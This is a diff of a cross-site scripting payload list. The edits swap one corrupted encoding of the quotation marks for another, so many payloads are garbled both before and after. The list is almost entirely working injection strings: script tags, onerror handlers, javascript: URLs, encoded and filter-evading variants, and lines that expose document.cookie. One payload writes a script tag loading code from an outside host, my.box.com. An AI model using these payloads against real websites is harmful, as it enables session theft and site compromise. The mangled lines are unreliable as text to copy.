@@ -2,20 +2,20 @@
 <ScRipT>alert("XSS");</ScRipT>
 <script>alert(123)</script>
 <script>alert("hellox worldss");</script>
-<script>alert(ìXSSî)</script> 
-<script>alert(ìXSSî);</script>
-<script>alert(ëXSSí)</script>
-ì><script>alert(ìXSSî)</script>
-<script>alert(/XSSî)</script>
+<script>alert(‚ÄúXSS‚Äù)</script> 
+<script>alert(‚ÄúXSS‚Äù);</script>
+<script>alert(‚ÄòXSS‚Äô)</script>
+‚Äú><script>alert(‚ÄúXSS‚Äù)</script>
+<script>alert(/XSS‚Äù)</script>
 <script>alert(/XSS/)</script>
 </script><script>alert(1)</script>
-ë; alert(1);
-ë)alert(1);//
+‚Äò; alert(1);
+‚Äò)alert(1);//
 <ScRiPt>alert(1)</sCriPt>
-<IMG SRC=jAVasCrIPt:alert(ëXSSí)>
-<IMG SRC=îjavascript:alert(ëXSSí);î>
+<IMG SRC=jAVasCrIPt:alert(‚ÄòXSS‚Äô)>
+<IMG SRC=‚Äùjavascript:alert(‚ÄòXSS‚Äô);‚Äù>
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
-<IMG SRC=javascript:alert(ëXSSí)>      
+<IMG SRC=javascript:alert(‚ÄòXSS‚Äô)>      
 <img src=xss onerror=alert(1)>
 
 
@@ -209,23 +209,23 @@ http://www.<script>alert(1)</script .com
 <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
 
 <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
-ë;alert(String.fromCharCode(88,83,83))//í;alert(String.fromCharCode(88,83,83))//î;alert(String.fromCharCode(88,83,83))//î;alert(String.fromCharCode(88,83,83))//ñ></SCRIPT>î>í><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
-<IMG ìîî><SCRIPT>alert(ìXSSî)</SCRIPT>î>
+‚Äò;alert(String.fromCharCode(88,83,83))//‚Äô;alert(String.fromCharCode(88,83,83))//‚Äù;alert(String.fromCharCode(88,83,83))//‚Äù;alert(String.fromCharCode(88,83,83))//‚Äì></SCRIPT>‚Äù>‚Äô><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<IMG ‚Äú‚Äù‚Äù><SCRIPT>alert(‚ÄúXSS‚Äù)</SCRIPT>‚Äù>
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
-<IMG SRC=îjav ascript:alert(ëXSSí);î>
-<IMG SRC=îjav&#x09;ascript:alert(ëXSSí);î>
-<<SCRIPT>alert(ìXSSî);//<</SCRIPT>
+<IMG SRC=‚Äùjav ascript:alert(‚ÄòXSS‚Äô);‚Äù>
+<IMG SRC=‚Äùjav&#x09;ascript:alert(‚ÄòXSS‚Äô);‚Äù>
+<<SCRIPT>alert(‚ÄúXSS‚Äù);//<</SCRIPT>
 %253cscript%253ealert(1)%253c/script%253e
-ì><sî%2bîcript>alert(document.cookie)</script>
+‚Äú><s‚Äù%2b‚Äùcript>alert(document.cookie)</script>
 foo<script>alert(1)</script>
 <scr<script>ipt>alert(1)</scr</script>ipt>
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
-<BODY BACKGROUND=îjavascript:alert(ëXSSí)î>
-<BODY ONLOAD=alert(ëXSSí)>
-<INPUT TYPE=îIMAGEî SRC=îjavascript:alert(ëXSSí);î>
-<IMG SRC=îjavascript:alert(ëXSSí)î
+<BODY BACKGROUND=‚Äùjavascript:alert(‚ÄòXSS‚Äô)‚Äù>
+<BODY ONLOAD=alert(‚ÄòXSS‚Äô)>
+<INPUT TYPE=‚ÄùIMAGE‚Äù SRC=‚Äùjavascript:alert(‚ÄòXSS‚Äô);‚Äù>
+<IMG SRC=‚Äùjavascript:alert(‚ÄòXSS‚Äô)‚Äù
 <iframe src=http://ha.ckers.org/scriptlet.html <
 javascript:alert("hellox worldss")
 <img src="javascript:alert('XSS');">
@@ -285,7 +285,7 @@ LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green
 &lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;
 &lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;
 &lt;IMG SRC=\"livescript&#058;&#91;code&#93;\"&gt;
-ûscriptualert(EXSSE)û/scriptu
+≈æscriptualert(EXSSE)≈æ/scriptu
 &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;
 &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;
 &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\"
@@ -466,7 +466,7 @@ perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
 <SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
 \";alert('XSS');//
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
-ºscriptæalert(¢XSS¢)º/scriptæ
+¬ºscript¬æalert(¬¢XSS¬¢)¬º/script¬æ
 <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
 <FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
@@ -508,17 +508,17 @@ a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
 +ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
 %2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
 %253cscript%253ealert(document.cookie)%253c/script%253e
-ì><sî%2bîcript>alert(document.cookie)</script>
-ì><ScRiPt>alert(document.cookie)</script>
-ì><<script>alert(document.cookie);//<</script>
+‚Äú><s‚Äù%2b‚Äùcript>alert(document.cookie)</script>
+‚Äú><ScRiPt>alert(document.cookie)</script>
+‚Äú><<script>alert(document.cookie);//<</script>
 foo<script>alert(document.cookie)</script>
 <scr<script>ipt>alert(document.cookie)</scr</script>ipt>
-%22/%3E%3CBODY%20onload=ídocument.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)í%3E
-ë; alert(document.cookie); var foo=í
-foo\í; alert(document.cookie);//í;
+%22/%3E%3CBODY%20onload=‚Äôdocument.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)‚Äô%3E
+‚Äò; alert(document.cookie); var foo=‚Äô
+foo\‚Äô; alert(document.cookie);//‚Äô;
 </script><script >alert(document.cookie)</script>
 <img src=asdf onerror=alert(document.cookie)>
-<BODY ONLOAD=alert(íXSSí)>
+<BODY ONLOAD=alert(‚ÄôXSS‚Äô)>
 <script>alert(1)</script>
 "><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
 <video src=1 onerror=alert(1)>
